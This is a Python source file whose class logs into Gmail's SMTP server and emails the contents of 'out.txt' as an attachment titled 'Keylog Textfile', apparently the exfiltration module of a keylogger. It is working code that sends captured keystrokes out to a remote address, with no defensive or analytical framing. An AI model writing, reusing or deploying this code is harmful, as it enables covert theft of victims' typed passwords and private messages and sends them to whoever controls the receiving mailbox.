import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

class emailSend:
    """
    Class used for email operations
    ...

    Attributes
    ----------
    smtp_username : str
        the user name for the email sender
    smtp_password : str
        the password for the eamil sender
    reciever : str
        the email address for the person recieving the email. 
    server : smtplib.SMTP
        the server instance to send the email. 
    outfileName : str
        the name of the output file. 

    """

    def __init__(self, smptUser: str, smtPass: str, recieverEmail: str, outFileName: str = "out.txt"):
        """
        Sets up the email server and signs user in, sends the email, and then closes the server.

        smtpUser : str
            the user name for the email sender
        smtPass : str
            the password for the eamil sender
        recieverEmail : str
            the email address for the person recieving the email. 
        """
        # Set up the SMTP server
        smtp_server = "smtp.gmail.com"
        smtp_port = 587
        self.smtp_username = smptUser
        self.smtp_password = smtPass
        self.reciever = recieverEmail
        self.server = smtplib.SMTP(smtp_server, smtp_port)
        self.server.starttls()
        self.server.login(self.smtp_username, self.smtp_password)



        # Create the message
        msg = MIMEMultipart()
        msg['Subject'] = 'Keylog Textfile'
        msg['From'] = self.smtp_username
        msg['To'] = self.reciever

        #read information from the text file to send
        with open('out.txt', 'r') as f:
            file_contents = f.read()
        # Add the file attachment
        part = MIMEApplication(file_contents.encode('utf-8'), Name=outFileName)
        part['Content-Disposition'] = f'attachment; filename={outFileName}'
        msg.attach(part)

        # Send the message
        self.server.sendmail(self.smtp_username, self.reciever, msg.as_string())

        # Close the SMTP server
        self.server.quit()
